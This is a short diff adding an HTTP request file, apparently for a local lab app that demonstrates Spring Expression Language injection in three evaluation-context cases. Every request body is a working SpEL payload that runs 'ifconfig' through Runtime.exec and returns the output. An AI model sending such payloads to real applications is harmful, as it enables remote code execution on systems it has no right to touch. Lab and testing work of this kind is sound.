@@ -1,0 +1,29 @@
+###
+# case1 spel
+POST /spel/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter("\\A").next()
+
+
+###
+# case2 spelStandardEvaluationContext
+POST /spel/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter("\\A").next()
+
+
+###
+# case3 spelMethodBasedEvaluationContext
+POST /spel/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter("\\A").next()
+
+
+
+
